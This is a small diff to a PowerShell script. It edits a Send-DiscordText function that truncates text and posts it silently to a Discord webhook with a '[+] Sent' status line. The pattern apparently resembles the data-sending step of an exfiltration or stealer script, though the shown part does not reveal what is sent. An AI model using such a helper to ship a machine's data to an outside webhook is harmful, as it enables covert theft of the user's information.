@@ -26,8 +26,8 @@ function Send-DiscordText {
     param([string]$Title, [string]$Content)
     if ([string]::IsNullOrWhiteSpace($Content)) { return }
     if ($Content.Length -gt 1900) { $Content = $Content.Substring(0, 1900) + "...[TRUNCATED]" }
-    $Message = "[$Title]`n```" + $Content + "```"
-    $payload = @{ content = $Message } | ConvertTo-Json
+    $msg = "[$Title]`n" + '```' + $Content + '```'
+    $payload = @{ content = $msg } | ConvertTo-Json
     try {
         Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
         Write-Host "[+] Sent: $Title"
